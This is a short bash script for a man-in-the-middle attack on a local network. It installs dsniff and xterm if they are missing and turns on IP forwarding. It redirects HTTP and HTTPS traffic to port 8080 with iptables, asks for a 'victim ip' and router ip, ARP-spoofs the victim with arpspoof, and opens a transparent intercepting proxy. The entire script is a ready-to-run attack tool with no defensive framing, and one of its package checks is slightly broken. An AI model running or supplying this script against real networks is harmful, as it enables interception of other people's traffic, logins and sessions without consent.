#!/bin/bash
l=dsniff
l2=xterm
I=`dpkg -s $l | grep "Status"`
I2=`dpkg -s $l2 | grep "Status"`
if [[ -n "$I" && -n "$l2" ]]; then
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
echo "1" > /proc/sys/net/ipv4/ip_forward
while [ "$net" = "" ]; do
    echo -n "Enter victim ip: "
    read net
    echo -n  "Enter router ip: "
    read net1
    echo -n "Enter Wifi interface[wlan0|wlp3s0|eth0]: "
    read interface
    if [ -n "$net" ]; then
        arpspoof -i $interface -t $net $net1 &
        xterm -e "./mitm --mode transparent"
    fi
    killall arpspoof
done
else
	apt install dsniff -y && apt install xterm -y
fi
